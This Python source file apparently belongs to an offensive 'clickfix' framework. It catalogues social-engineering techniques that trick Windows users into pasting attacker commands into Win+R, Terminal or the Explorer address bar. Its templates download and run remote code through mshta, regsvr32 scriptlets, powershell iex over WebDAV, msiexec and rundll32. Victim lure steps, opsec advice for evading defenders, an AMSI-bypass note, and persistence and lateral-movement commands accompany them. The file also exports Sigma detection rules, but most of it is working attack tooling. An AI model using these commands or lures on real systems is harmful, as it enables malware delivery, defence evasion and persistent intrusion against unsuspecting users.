# language: Python 3.11+, file: cf/techniques.py
# *clickfix technique catalog — surfaces, lolbins, telemetry, opsec notes*
from __future__ import annotations

import time
from collections.abc import Iterable
from dataclasses import dataclass, field

from .stager import KINDS, Stager

SURFACES = ("winr", "terminal", "explorer", "protocol", "host", "share", "package", "persist")
CATEGORIES = ("clickfix", "lolbin", "protocol", "package", "share", "defense", "persist", "lateral")


@dataclass(frozen=True, slots=True)
class Technique:
    """One way to make a human run attacker content.

    kind      — stager kind this framework can serve end to end (None = needs
                operator infra: smb/webdav share, hosted msi/appx, file drop).
    template  — command template for kind=None entries; supports {url} {host}
                {token} {exe}. Never contains braces of its own.
    steps     — the exact victim instructions rendered on the lure page.
    telemetry — windows logging artifacts a blue team can expect.
    """

    id: str
    name: str
    surface: str
    category: str
    kind: str | None
    template: str
    steps: tuple[str, ...]
    clipboard: bool
    min_os: str
    mitre: str | None
    telemetry: tuple[str, ...]
    detection: str
    opsec: str
    reliability: int
    tags: tuple[str, ...] = field(default=())

    def command_for(self, base: str = "", token: str = "TOKEN") -> str:
        host = base.rstrip("/") if base else "https://HOST"
        if self.kind:
            return Stager.command(self.kind, f"{host}/s/{self.kind}/{token}")
        return self.template.format(url=host, host=host, token=token, exe="%TEMP%\\u.exe")

    def as_dict(self) -> dict[str, object]:
        return {
            "id": self.id,
            "name": self.name,
            "surface": self.surface,
            "category": self.category,
            "kind": self.kind,
            "serveable": self.kind is not None,
            "clipboard": self.clipboard,
            "min_os": self.min_os,
            "mitre": self.mitre,
            "telemetry": list(self.telemetry),
            "detection": self.detection,
            "opsec": self.opsec,
            "reliability": self.reliability,
            "tags": list(self.tags),
            "steps": list(self.steps),
            "command": self.command_for("https://HOST", "TOKEN"),
        }


def _t(**kw: object) -> Technique:
    return Technique(**kw)  # type: ignore[arg-type]


# ─── win+R : the canonical clickfix surface ───
_TECHNIQUES: tuple[Technique, ...] = (
    _t(
        id="winr-irm",
        name="Win+R powershell irm|iex",
        surface="winr",
        category="clickfix",
        kind="irm",
        template="",
        steps=("Press the Windows key + R", "Paste the command with Ctrl + V", "Press Enter"),
        clipboard=True,
        min_os="win10+",
        mitre="T1059.001",
        telemetry=("4688", "4104", "sysmon:1", "sysmon:3"),
        detection="explorer.exe spawning powershell.exe with -nop -ep bypass and a remote invoke",
        opsec="url is visible in the command line and in 4104; prefer winr-enc for shared screens",
        reliability=5,
        tags=("default", "fileless"),
    ),
    _t(
        id="winr-iex",
        name="Win+R iex(iwr) classic",
        surface="winr",
        category="clickfix",
        kind="ps",
        template="",
        steps=("Press the Windows key + R", "Paste the recovery command", "Press Enter"),
        clipboard=True,
        min_os="win10+",
        mitre="T1059.001",
        telemetry=("4688", "4104", "sysmon:1", "sysmon:3"),
        detection="powershell.exe child of explorer.exe reading an http url with Invoke-WebRequest",
        opsec="older kits used this shape; signature-like strings (iwr -useb) are widely allow/deny listed",
        reliability=5,
        tags=("classic",),
    ),
    _t(
        id="winr-enc",
        name="Win+R powershell -enc (url hidden)",
        surface="winr",
        category="clickfix",
        kind="psenc",
        template="",
        steps=("Press the Windows key + R", "Paste the verification key", "Press Enter"),
        clipboard=True,
        min_os="win10+",
        mitre="T1059.001",
        telemetry=("4688", "4104"),
        detection="base64 blob in -enc decodes to Invoke-WebRequest|iex; 4104 logs the decoded script",
        opsec="defeats shoulder surfing and commandline-only sensors; script block logging still sees it",
        reliability=5,
        tags=("stealth", "default"),
    ),
    _t(
        id="winr-curl",
        name="Win+R curl piped to powershell",
        surface="winr",
        category="lolbin",
        kind="curl",
        template="",
        steps=("Press the Windows key + R", "Paste the download command", "Press Enter"),
        clipboard=True,
        min_os="win10 1803+",
        mitre="T1105",
        telemetry=("4688", "sysmon:1", "sysmon:3"),
        detection="curl.exe (signed microsoft binary) fetching a script piped into powershell",
        opsec="curl.exe is allow-listed in many environments; no powershell download cradle on the cmdline",
        reliability=4,
        tags=("lolbin",),
    ),
    _t(
        id="winr-certutil",
        name="Win+R certutil -urlcache",
        surface="winr",
        category="lolbin",
        kind="certutil",
        template="",
        steps=("Press the Windows key + R", "Paste the restore command", "Press Enter"),
        clipboard=True,
        min_os="win10+",
        mitre="T1105",
        telemetry=("4688", "sysmon:1", "sysmon:3", "sysmon:11"),
        detection="certutil.exe with -urlcache writing an executable or script to %TEMP%",
        opsec="heavily fingerprinted; use only against estates without certutil blocking rules",
        reliability=3,
        tags=("lolbin", "noisy"),
    ),
    _t(
        id="winr-bitsadmin",
        name="Win+R bitsadmin /transfer",
        surface="winr",
        category="lolbin",
        kind="bitsadmin",
        template="",
        steps=("Press the Windows key + R", "Paste the transfer command", "Press Enter"),
        clipboard=True,
        min_os="win10+",
        mitre="T1105",
        telemetry=("4688", "sysmon:3", "sysmon:11"),
        detection="bitsadmin.exe creating a download job then powershell executing the dropped file",
        opsec="bits jobs survive logoff; clean the job name to avoid persistence-shaped artifacts",
        reliability=3,
        tags=("lolbin", "resilient"),
    ),
    _t(
        id="winr-mshta",
        name="Win+R mshta remote hta",
        surface="winr",
        category="lolbin",
        kind="hta",
        template="",
        steps=("Press the Windows key + R", "Paste the document command", "Press Enter"),
        clipboard=True,
        min_os="win10+",
        mitre="T1218.005",
        telemetry=("4688", "sysmon:1", "sysmon:3"),
        detection="mshta.exe fetching a .hta over http with an inline VBScript/JScript payload",
        opsec="mshta is disabled on some hardened estates (blocklisted via ASR); no powershell on cmdline",
        reliability=4,
        tags=("lolbin", "script-host"),
    ),
    _t(
        id="winr-regsvr32",
        name="Win+R regsvr32 scrobj.dll scriptlet",
        surface="winr",
        category="lolbin",
        kind="sct",
        template="",
        steps=("Press the Windows key + R", "Paste the verification script", "Press Enter"),
        clipboard=True,
        min_os="win10+",
        mitre="T1218.010",
        telemetry=("4688", "sysmon:1", "sysmon:3"),
        detection="regsvr32.exe /s /n /u /i:<url> scrobj.dll — the squiblydoo signature",
        opsec="short command, no powershell binary; scriptlet fetch is logged by sysmon network events",
        reliability=4,
        tags=("lolbin", "squiblydoo"),
    ),
    _t(
        id="winr-copy-paste",
        name="Win+R via page copy button",
        surface="winr",
        category="clickfix",
        kind="irm",
        template="",
        steps=(
            "Click Copy command",
            "Press the Windows key + R",
            "Paste with Ctrl + V",
            "Press Enter",
        ),
        clipboard=True,
        min_os="win10+",
        mitre="T1566.002",
        telemetry=("4688", "4104"),
        detection="correlate the http hit on the lure domain with a powershell spawn within 60s",
        opsec="the page gates continue on the copy event, so the victim never types the payload",
        reliability=5,
        tags=("core", "default"),
    ),
    _t(
        id="winr-unc-hta",
        name="Win+R mshta from WebDAV share",
        surface="winr",
        category="share",
        kind=None,
        template="mshta \\\\{host}@80\\doc.hta",
        steps=("Press the Windows key + R", "Paste the document command", "Press Enter"),
        clipboard=True,
        min_os="win10+",
        mitre="T1218.005",
        telemetry=("4688", "sysmon:1", "sysmon:3", "sysmon:11"),
        detection="mshta resolving an ip with the @80 webdav path form over port 80",
        opsec="needs an operator webdav listener (impacket/http-server); no inbound https to the victim",
        reliability=3,
        tags=("webdav", "infra"),
    ),
    # ─── terminal paste : windows terminal / win+x ───
    _t(
        id="term-winx",
        name="Win+X Terminal paste",
        surface="terminal",
        category="clickfix",
        kind="irm",
        template="",
        steps=(
            "Right-click the Start button",
            "Open Terminal",
            "Paste with Ctrl + V",
            "Press Enter",
        ),
        clipboard=True,
        min_os="win11",
        mitre="T1059.001",
        telemetry=("4688", "4104", "sysmon:1"),
        detection="pwsh.exe or WindowsTerminal.exe hosting powershell.exe with a remote invoke",
        opsec="default terminal on win11; the paste lands in the console buffer, not in a dialog",
        reliability=5,
        tags=("win11", "modern"),
    ),
    _t(
        id="term-winx-admin",
        name="Win+X Terminal (Admin) paste",
        surface="terminal",
        category="clickfix",
        kind="irm",
        template="",
        steps=(
            "Right-click the Start button",
            "Open Terminal (Admin) and accept the prompt",
            "Paste with Ctrl + V",
            "Press Enter",
        ),
        clipboard=True,
        min_os="win11",
        mitre="T1059.001",
        telemetry=("4688", "4104", "consent.exe", "sysmon:1"),
        detection="high-integrity powershell spawned from WindowsTerminal after a consent.exe prompt",
        opsec="one extra UAC click raises privileges for the whole chain; victims trained to click Yes",
        reliability=4,
        tags=("uac", "win11", "elevated"),
    ),
    _t(
        id="term-winx-enc",
        name="Win+X Terminal with encoded blob",
        surface="terminal",
        category="clickfix",
        kind="psenc",
        template="",
        steps=(
            "Right-click the Start button",
            "Open Terminal",
            "Paste the verification key with Ctrl + V",
            "Press Enter",
        ),
        clipboard=True,
        min_os="win11",
        mitre="T1059.001",
        telemetry=("4688", "4104"),
        detection="powershell -enc from a terminal host; decode the blob offline",
        opsec="nothing readable on screen; pairs well with a support-desk pretext",
        reliability=5,
        tags=("stealth", "win11"),
    ),
    _t(
        id="term-winx-curl",
        name="Win+X Terminal curl pipe",
        surface="terminal",
        category="lolbin",
        kind="curl",
        template="",
        steps=(
            "Right-click the Start button",
            "Open Terminal",
            "Paste the download command",
            "Press Enter",
        ),
        clipboard=True,
        min_os="win11",
        mitre="T1105",
        telemetry=("4688", "sysmon:3"),
        detection="curl.exe inside a terminal session writing or piping a script",
        opsec="looks like a developer workflow; low alarm on engineering endpoints",
        reliability=4,
        tags=("lolbin", "win11"),
    ),
    _t(
        id="term-startmenu",
        name="Start menu search → PowerShell paste",
        surface="terminal",
        category="clickfix",
        kind="irm",
        template="",
        steps=(
            "Press the Windows key and type PowerShell",
            "Press Enter",
            "Paste the command with Ctrl + V",
            "Press Enter",
        ),
        clipboard=True,
        min_os="win10+",
        mitre="T1059.001",
        telemetry=("4688", "4104", "sysmon:1"),
        detection="powershell.exe started from searchhost.exe / StartMenuExperienceHost",
        opsec="works on win10 where the win+x terminal is absent; no run dialog involved at all",
        reliability=4,
        tags=("win10",),
    ),
    # ─── explorer surface ───
    _t(
        id="explorer-address",
        name="Explorer address bar command",
        surface="explorer",
        category="clickfix",
        kind="irm",
        template="",
        steps=(
            "Open any folder window",
            "Press Ctrl + L and paste the command",
            "Press Enter",
        ),
        clipboard=True,
        min_os="win10+",
        mitre="T1059.001",
        telemetry=("4688", "4104", "sysmon:1"),
        detection="powershell spawned by explorer.exe from an address bar navigation event",
        opsec="explorer runs typed commands exactly like Win+R; no run-dialog telemetry exists to correlate",
        reliability=4,
        tags=("stealth",),
    ),
    _t(
        id="explorer-address-hta",
        name="Explorer address bar mshta",
        surface="explorer",
        category="lolbin",
        kind="hta",
        template="",
        steps=(
            "Open any folder window",
            "Press Ctrl + L and paste the document command",
            "Press Enter",
        ),
        clipboard=True,
        min_os="win10+",
        mitre="T1218.005",
        telemetry=("4688", "sysmon:1", "sysmon:3"),
        detection="mshta.exe spawned by explorer.exe with a remote .hta argument",
        opsec="avoids the run dialog entirely; pair with a file-recovery pretext",
        reliability=4,
        tags=("stealth", "lolbin"),
    ),
    _t(
        id="explorer-address-certutil",
        name="Explorer address bar certutil fetch",
        surface="explorer",
        category="lolbin",
        kind="certutil",
        template="",
        steps=(
            "Open any folder window",
            "Press Ctrl + L and paste the restore command",
            "Press Enter",
        ),
        clipboard=True,
        min_os="win10+",
        mitre="T1105",
        telemetry=("4688", "sysmon:1", "sysmon:11"),
        detection="certutil.exe writing to %TEMP% then powershell launching the file",
        opsec="noisy binary; the explorer parent makes it look like a file operation",
        reliability=3,
        tags=("lolbin", "noisy"),
    ),
    _t(
        id="explorer-search-ms",
        name="Explorer search-ms virtual folder",
        surface="explorer",
        category="protocol",
        kind=None,
        template="search-ms:query=receipt&crumb=location:\\\\{host}@80\\inbox",
        steps=(
            "Open any folder window",
            "Press Ctrl + L and paste the address",
            "Press Enter and open the first result",
        ),
        clipboard=True,
        min_os="win10+",
        mitre="T1553.005",
        telemetry=("4688", "sysmon:1", "sysmon:11"),
        detection="explorer resolving search-ms: with a remote crumb location over webdav",
        opsec="files opened this way can lose the mark-of-the-web depending on patch level",
        reliability=3,
        tags=("motw", "webdav", "infra"),
    ),
    _t(
        id="explorer-map-drive",
        name="Map network drive to attacker share",
        surface="explorer",
        category="share",
        kind=None,
        template="net use z: \\\\{host}\\share /user:public x",
        steps=(
            "Open any folder window",
            "Press Ctrl + L and paste the address",
            "Press Enter and open the mapped drive",
        ),
        clipboard=True,
        min_os="win10+",
        mitre="T1021.002",
        telemetry=("5140", "4688", "sysmon:1", "sysmon:11"),
        detection="smb mapping to an external ip then script execution from the mapped letter",
        opsec="needs an smb listener and a believable share name; strong for intranet pretexts",
        reliability=2,
        tags=("smb", "infra"),
    ),
    # ─── host / lolbin variants ───
    _t(
        id="host-mshta-inline",
        name="mshta inline javascript payload",
        surface="host",
        category="lolbin",
        kind=None,
        template="mshta javascript:var x=new%20ActiveXObject('MSXML2.ServerXMLHTTP.6.0');x.open('GET','{url}',false);x.send();eval(x.ResponseText)",
        steps=("Press the Windows key + R", "Paste the inline script", "Press Enter"),
        clipboard=True,
        min_os="win10+",
        mitre="T1218.005",
        telemetry=("4688", "sysmon:1", "sysmon:3"),
        detection="mshta with an inline javascript: scheme argument — no file touched on disk",
        opsec="entire payload lives on the command line; keep it short or it truncates in the run dialog",
        reliability=3,
        tags=("fileless", "noisy"),
    ),
    _t(
        id="host-wscript-unc",
        name="wscript against a WebDAV script",
        surface="host",
        category="share",
        kind=None,
        template="wscript //B //E:jscript \\\\{host}@80\\fix.js",
        steps=("Press the Windows key + R", "Paste the script command", "Press Enter"),
        clipboard=True,
        min_os="win10+",
        mitre="T1059.005",
        telemetry=("4688", "sysmon:1", "sysmon:3", "sysmon:11"),
        detection="wscript.exe fetching jscript from a webdav path",
        opsec="silent flag hides the host window; needs webdav and a script that looks like a helper",
        reliability=3,
        tags=("webdav", "infra"),
    ),
    _t(
        id="host-rundll32-unc",
        name="rundll32 load from WebDAV",
        surface="host",
        category="lolbin",
        kind=None,
        template="rundll32 \\\\{host}@80\\lib.dll,Entry",
        steps=("Press the Windows key + R", "Paste the library command", "Press Enter"),
        clipboard=True,
        min_os="win10+",
        mitre="T1218.011",
        telemetry=("4688", "sysmon:1", "sysmon:3"),
        detection="rundll32.exe loading a dll over webdav with an exported entry point",
        opsec="dll must be exported and beacon back on its own; no script host involved",
        reliability=2,
        tags=("webdav", "infra"),
    ),
    _t(
        id="host-msiexec",
        name="msiexec remote package",
        surface="host",
        category="package",
        kind=None,
        template="msiexec /qn /i {url}/setup.msi",
        steps=("Press the Windows key + R", "Paste the installer command", "Press Enter"),
        clipboard=True,
        min_os="win10+",
        mitre="T1218.007",
        telemetry=("4688", "sysmon:1", "sysmon:11", "msiinstaller"),
        detection="msiexec.exe downloading a package from a non-corporate origin",
        opsec="quiet install avoids the ui; package must be signed or smartscreen intervenes",
        reliability=3,
        tags=("installer", "infra"),
    ),
    _t(
        id="host-msbuild",
        name="msbuild inline project",
        surface="host",
        category="lolbin",
        kind=None,
        template="msbuild {url}/p.xml",
        steps=("Press the Windows key + R", "Paste the build command", "Press Enter"),
        clipboard=True,
        min_os="win10+",
        mitre="T1218.009",
        telemetry=("4688", "sysmon:1", "sysmon:3"),
        detection="msbuild.exe compiling a project fetched over http with an inline task",
        opsec="signed microsoft binary; project file is a csharp/vb task host",
        reliability=3,
        tags=("lolbin", "infra"),
    ),
    _t(
        id="host-installutil",
        name="installutil downloaded assembly",
        surface="host",
        category="lolbin",
        kind=None,
        template="installutil /logfile= /UtilAssembly={url}/a.dll /CommandLine= /U",
        steps=("Press the Windows key + R", "Paste the assembly command", "Press Enter"),
        clipboard=True,
        min_os="win10+",
        mitre="T1218.004",
        telemetry=("4688", "sysmon:1"),
        detection="installutil.exe running a downloaded assembly with the /U uninstall flag",
        opsec="needs dotnet framework present; the /U flag executes the uninstaller entry point",
        reliability=2,
        tags=("lolbin", "dotnet"),
    ),
    _t(
        id="host-ps-unc",
        name="powershell runs a WebDAV script file",
        surface="host",
        category="share",
        kind=None,
        template="powershell -w h -ep bypass -c iex(gc \\\\{host}@80\\x.ps1 -Raw)",
        steps=("Press the Windows key + R", "Paste the script command", "Press Enter"),
        clipboard=True,
        min_os="win10+",
        mitre="T1059.001",
        telemetry=("4688", "4104", "sysmon:3"),
        detection="powershell reading a script from a unc webdav path",
        opsec="script content never crosses https; webdav redirector keeps the c2 domain clean",
        reliability=3,
        tags=("webdav", "infra"),
    ),
    # ─── protocol handlers ───
    _t(
        id="proto-search-ms-winr",
        name="Win+R search-ms virtual folder",
        surface="protocol",
        category="protocol",
        kind=None,
        template="search-ms:query=invoice&crumb=location:{url}",
        steps=("Press the Windows key + R", "Paste the address", "Press Enter and open the file"),
        clipboard=True,
        min_os="win10+",
        mitre="T1553.005",
        telemetry=("4688", "sysmon:11"),
        detection="explorer launched with a search-ms: argument pointing at an external location",
        opsec="victim sees a familiar search result window instead of a download prompt",
        reliability=3,
        tags=("motw",),
    ),
    _t(
        id="proto-appinstaller",
        name="ms-appinstaller protocol",
        surface="protocol",
        category="package",
        kind=None,
        template="ms-appinstaller:?uri={url}/app.appinstaller",
        steps=("Press the Windows key + R", "Paste the install link", "Press Enter and choose Install"),
        clipboard=True,
        min_os="win10+",
        mitre="T1195.002",
        telemetry=("4688", "sysmon:1", "appinstaller"),
        detection="appinstaller protocol handler fetching a remote .appinstaller manifest",
        opsec="win11 blocks remote sources by default — needs the store settings flipped",
        reliability=2,
        tags=("installer", "infra"),
    ),
    # ─── package managers ───
    _t(
        id="pkg-winget-configure",
        name="winget configure remote DSC",
        surface="package",
        category="package",
        kind=None,
        template="winget configure -f {url}/config.dsc.yaml",
        steps=("Press the Windows key + R", "Paste the configuration command", "Press Enter"),
        clipboard=True,
        min_os="win11",
        mitre="T1218",
        telemetry=("4688", "sysmon:1", "sysmon:11"),
        detection="winget.exe fetching a DSC configuration document over http",
        opsec="legitimate admin tooling; the dsc script can install packages and run resources",
        reliability=2,
        tags=("dsc", "infra"),
    ),
    _t(
        id="pkg-winget-install",
        name="winget install attacker package",
        surface="package",
        category="package",
        kind=None,
        template="cmd /c winget source add cf {url}&winget install -e --id Vendor.Tool --source cf",
        steps=("Press the Windows key + R", "Paste the install command", "Press Enter"),
        clipboard=True,
        min_os="win11",
        mitre="T1195.002",
        telemetry=("4688", "sysmon:1", "sysmon:11"),
        detection="winget installing a package outside the organisation catalogue",
        opsec="needs the payload published or a sideloaded source; slow but very legitimate looking",
        reliability=2,
        tags=("supply-chain",),
    ),
    _t(
        id="pkg-appx",
        name="Add-AppxPackage remote bundle",
        surface="package",
        category="package",
        kind=None,
        template="powershell -ep bypass -c Add-AppxPackage -Path {url}/app.appx",
        steps=("Press the Windows key + R", "Paste the package command", "Press Enter"),
        clipboard=True,
        min_os="win10+",
        mitre="T1195.002",
        telemetry=("4688", "sysmon:1", "sysmon:11"),
        detection="powershell adding an appx package from a remote path",
        opsec="package must be signed with a trusted cert or the install is refused",
        reliability=2,
        tags=("installer", "infra"),
    ),
    # ─── webdav / smb delivery shapes ───
    _t(
        id="share-webdav-ps",
        name="powershell file from WebDAV",
        surface="share",
        category="share",
        kind=None,
        template="powershell -ep bypass -f \\\\{host}@80\\run.ps1",
        steps=("Press the Windows key + R", "Paste the script command", "Press Enter"),
        clipboard=True,
        min_os="win10+",
        mitre="T1059.001",
        telemetry=("4688", "4104", "sysmon:3"),
        detection="powershell executing a script file hosted on a webdav path",
        opsec="windows treats \\\\host@80\\ as http; no smb inbound required on the c2",
        reliability=3,
        tags=("webdav", "infra"),
    ),
    _t(
        id="share-webdav-sct",
        name="regsvr32 scriptlet from WebDAV",
        surface="share",
        category="share",
        kind=None,
        template="regsvr32 /s /n /u /i:\\\\{host}@80\\fix.sct scrobj.dll",
        steps=("Press the Windows key + R", "Paste the verification script", "Press Enter"),
        clipboard=True,
        min_os="win10+",
        mitre="T1218.010",
        telemetry=("4688", "sysmon:1", "sysmon:3"),
        detection="regsvr32 loading a scriptlet from a webdav path",
        opsec="classic squiblydoo over webdav; blocked by ASR rule 7674baac in some estates",
        reliability=3,
        tags=("webdav", "squiblydoo"),
    ),
    # ─── defence evasion notes ───
    _t(
        id="dev-amsi-fieldpatch",
        name="AMSI init flag patch in loader",
        surface="host",
        category="defense",
        kind=None,
        template="loader-level: amsiInitFailed field patch before stage2 (built into cf loaders)",
        steps=("Press the Windows key + R", "Paste the verification command", "Press Enter"),
        clipboard=True,
        min_os="win10+",
        mitre="T1562.001",
        telemetry=("4104", "defender:1116"),
        detection="script block logging still records the pre-patch script even when the scan fails",
        opsec="field patch is signature-hot on defender; treat it as a last-resort layer, not a cloak",
        reliability=3,
        tags=("amsi",),
    ),
    _t(
        id="dev-motw-strip",
        name="scriptlet path avoids mark-of-the-web",
        surface="host",
        category="defense",
        kind=None,
        template="sct/hta paths inherit MotW semantics — serve clean content types and no download headers",
        steps=("Press the Windows key + R", "Paste the script command", "Press Enter"),
        clipboard=True,
        min_os="win10+",
        mitre="T1553.005",
        telemetry=("sysmon:11", "defender:1116"),
        detection="motw present on dropped files; its absence on a script is itself an indicator",
        opsec="our server sends no Content-Disposition, so nothing is tagged as a download",
        reliability=4,
        tags=("motw",),
    ),
    # ─── persistence (post-exec, apt mode) ───
    _t(
        id="persist-runkey",
        name="HKCU Run key",
        surface="persist",
        category="persist",
        kind=None,
        template="reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d {exe} /f",
        steps=("Stage 2 is already running", "The run key is written by the implant", "Reboot to validate"),
        clipboard=False,
        min_os="win10+",
        mitre="T1547.001",
        telemetry=("4657", "sysmon:13", "sysmon:1"),
        detection="reg.exe or NtSetValueKey on a Run key with a value pointing at %TEMP%",
        opsec="most fingerprinted persistence there is; rotate the value name per engagement",
        reliability=5,
        tags=("persistence",),
    ),
    _t(
        id="persist-schtasks",
        name="Scheduled task at logon",
        surface="persist",
        category="persist",
        kind=None,
        template="schtasks /create /tn Updater /tr {exe} /sc onlogon /ru user",
        steps=("Stage 2 is already running", "The task is registered by the implant", "Reboot to validate"),
        clipboard=False,
        min_os="win10+",
        mitre="T1053.005",
        telemetry=("4698", "sysmon:1", "taskscheduler"),
        detection="new scheduled task registered by a non-installer process",
        opsec="tasks are visible in taskschd.msc — use believable names and a trigger delay",
        reliability=4,
        tags=("persistence",),
    ),
    _t(
        id="persist-wmi",
        name="WMI event subscription",
        surface="persist",
        category="persist",
        kind=None,
        template="wmic /namespace:\\\\root\\subscription path __EventConsumer create Name=cf CommandLineTemplate={exe}",
        steps=("Stage 2 is already running", "The subscription is created by the implant", "Wait for the trigger"),
        clipboard=False,
        min_os="win10+",
        mitre="T1546.003",
        telemetry=("4688", "sysmon:19", "sysmon:20", "sysmon:21"),
        detection="new __EventFilter / __EventConsumer / FilterToConsumerBinding triplet",
        opsec="fileless and admin-only; trigger on process start rather than timer to stay quiet",
        reliability=3,
        tags=("persistence", "fileless"),
    ),
    _t(
        id="persist-startup",
        name="Startup folder drop",
        surface="persist",
        category="persist",
        kind=None,
        template="copy {exe} %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\u.exe",
        steps=("Stage 2 is already running", "The binary is copied to Startup", "Reboot to validate"),
        clipboard=False,
        min_os="win10+",
        mitre="T1547.001",
        telemetry=("11", "sysmon:11", "sysmon:1"),
        detection="executable appearing in a user Startup folder without an installer parent",
        opsec="survives without admin; any user can see it in explorer — prefer a document-looking name",
        reliability=4,
        tags=("persistence",),
    ),
    _t(
        id="persist-service",
        name="New auto-start service",
        surface="persist",
        category="persist",
        kind=None,
        template="sc create Updater binPath= {exe} start= auto",
        steps=("Stage 2 is already running", "The service is registered by the implant", "Reboot to validate"),
        clipboard=False,
        min_os="win10+",
        mitre="T1543.003",
        telemetry=("4697", "sysmon:1"),
        detection="new service creation with a binary path outside system32",
        opsec="needs local admin; service creation is a high-signal event on most blue teams",
        reliability=3,
        tags=("persistence", "elevated"),
    ),
    _t(
        id="persist-winlogon",
        name="Winlogon Userinit hijack",
        surface="persist",
        category="persist",
        kind=None,
        template="reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Userinit /d {exe},C:\\Windows\\system32\\userinit.exe /f",
        steps=("Stage 2 is already running", "The hijack is written by the implant", "Reboot to validate"),
        clipboard=False,
        min_os="win10+",
        mitre="T1547.004",
        telemetry=("4657", "sysmon:13"),
        detection="Userinit value changed to include a path outside system32",
        opsec="breaks login if wrong — keep the real userinit.exe suffix; high impact, high visibility",
        reliability=2,
        tags=("persistence", "elevated", "risky"),
    ),
    # ─── lateral movement shape ───
    _t(
        id="lateral-icm",
        name="PowerShell Invoke-Command to a peer",
        surface="persist",
        category="lateral",
        kind=None,
        template="powershell -ep bypass -c icm {host} -scriptblock {exe}",
        steps=("Credentials are already in memory", "Run from an operator shell", "Confirm the beacon"),
        clipboard=False,
        min_os="win10+",
        mitre="T1021.006",
        telemetry=("4688", "4104", "91", "sysmon:3"),
        detection="winrm/5985 traffic between workstations plus powershell remoting event 91",
        opsec="needs winrm enabled and valid credentials; the loudest step in an intrusion",
        reliability=2,
        tags=("lateral", "winrm"),
    ),
)


TECHNIQUES: dict[str, Technique] = {t.id: t for t in _TECHNIQUES}


def known_ids() -> list[str]:
    return list(TECHNIQUES)


def get(technique_id: str) -> Technique:
    tech = TECHNIQUES.get(technique_id)
    if tech is None:
        raise KeyError(
            f"unknown technique {technique_id!r} — try `clickfix.py technique list`"
        )
    return tech


def find(
    surface: str = "",
    category: str = "",
    query: str = "",
    serveable: bool | None = None,
    tag: str = "",
) -> list[Technique]:
    out: list[Technique] = []
    for tech in TECHNIQUES.values():
        if surface and tech.surface != surface:
            continue
        if category and tech.category != category:
            continue
        if serveable is not None and (tech.kind is not None) != serveable:
            continue
        if tag and tag not in tech.tags:
            continue
        if query:
            blob = f"{tech.id} {tech.name} {tech.opsec} {tech.detection} {' '.join(tech.tags)}"
            if query.lower() not in blob.lower():
                continue
        out.append(tech)
    return out


def table(rows: Iterable[Technique] | None = None) -> list[dict[str, object]]:
    return [
        {
            "id": t.id,
            "surface": t.surface,
            "category": t.category,
            "kind": t.kind or "-",
            "clipboard": "yes" if t.clipboard else "no",
            "reliability": t.reliability,
            "mitre": t.mitre or "-",
            "name": t.name,
        }
        for t in (rows if rows is not None else TECHNIQUES.values())
    ]


def markdown() -> str:
    lines = ["# clickfix technique catalog", ""]
    for surface in SURFACES:
        rows = [t for t in TECHNIQUES.values() if t.surface == surface]
        if not rows:
            continue
        lines.append(f"## {surface}")
        lines.append("")
        for t in rows:
            kind = t.kind or "operator infra"
            lines.append(f"### {t.id} — {t.name}")
            lines.append(f"- surface: {t.surface} / category: {t.category}")
            lines.append(f"- delivery: {kind} · min os: {t.min_os} · reliability: {t.reliability}/5")
            lines.append(f"- mitre: {t.mitre or 'n/a'}")
            lines.append(f"- command: `{t.command_for('https://HOST', 'TOKEN')}`")
            lines.append(f"- steps: {' → '.join(t.steps)}")
            lines.append(f"- telemetry: {', '.join(t.telemetry)}")
            lines.append(f"- detection: {t.detection}")
            lines.append(f"- opsec: {t.opsec}")
            lines.append("")
    return "\n".join(lines)


def validate() -> list[str]:
    """Self-check used by the test suite — keeps the catalog honest."""
    problems: list[str] = []
    for tech in TECHNIQUES.values():
        if tech.surface not in SURFACES:
            problems.append(f"{tech.id}: bad surface {tech.surface}")
        if tech.category not in CATEGORIES:
            problems.append(f"{tech.id}: bad category {tech.category}")
        if tech.kind is not None and tech.kind not in KINDS:
            problems.append(f"{tech.id}: unknown stager kind {tech.kind}")
        if len(tech.steps) < 3:
            problems.append(f"{tech.id}: needs at least 3 steps")
        if not 1 <= tech.reliability <= 5:
            problems.append(f"{tech.id}: reliability out of range")
        if tech.kind is None and tech.category != "defense" and not any(
            k in tech.template for k in ("{url}", "{host}", "{exe}")
        ):
            problems.append(f"{tech.id}: template has no placeholder")
        if tech.kind is not None and tech.template:
            problems.append(f"{tech.id}: kind techniques must not carry a template")
        if tech.mitre and not tech.mitre.startswith("T"):
            problems.append(f"{tech.id}: bad mitre id {tech.mitre}")
    return problems


# ─── sigma export — one detection rule per serveable technique ───

# kind → (binary, extra commandline keywords a blue team should watch for)
_SIGMA_BIN: dict[str, tuple[str, tuple[str, ...]]] = {
    "ps": ("powershell.exe", ("-nop", "iex")),
    "psenc": ("powershell.exe", ("-enc",)),
    "irm": ("powershell.exe", ("irm", "invoke-restmethod")),
    "curl": ("curl.exe", ("|powershell",)),
    "certutil": ("certutil.exe", ("-urlcache",)),
    "bitsadmin": ("bitsadmin.exe", ("/transfer",)),
    "hta": ("mshta.exe", (".hta",)),
    "sct": ("regsvr32.exe", ("scrobj.dll", "/i:")),
}


def _sigma_rule(tech: Technique) -> str:
    bin_name, keywords = _SIGMA_BIN.get(tech.kind or "", ("powershell.exe", ()))
    kw_lines = "\n".join(
        f"        - CommandLine|contains|all: '{kw}'" for kw in keywords
    ) or "        - CommandLine|contains: 'placeholder'"
    mitre = tech.mitre or "T1059"
    tid, sub = (mitre.split(".") + [""])[:2]
    technique_id = f"{tid}.{sub}" if sub else tid
    return f"""title: redveil — {tech.id} — {tech.name}
id: rv-{tech.id}
status: experimental
description: >
  {tech.detection}
references:
  - mitre: {tech.mitre or 'n/a'}
author: redveil framework
date: {time.strftime('%Y/%m/%d')}
tags:
  - attack.{technique_id.lower()}
logsource:
  category: process_creation
  product: windows
detection:
  sel_parent:
    ParentImage|endswith: '\\\\explorer.exe'
    Image|endswith: '\\\\{bin_name}'
  sel_cmd:
{kw_lines}
  condition: sel_parent and sel_cmd
falsepositives:
  - helpdesk instructing a user through the run dialog
level: high
"""


def sigma_rules(serveable_only: bool = True) -> str:
    """YAML document per technique — ready to drop in a sigma stack."""
    docs = [
        _sigma_rule(t)
        for t in TECHNIQUES.values()
        if t.kind or not serveable_only
    ]
    return "---\n".join(docs)
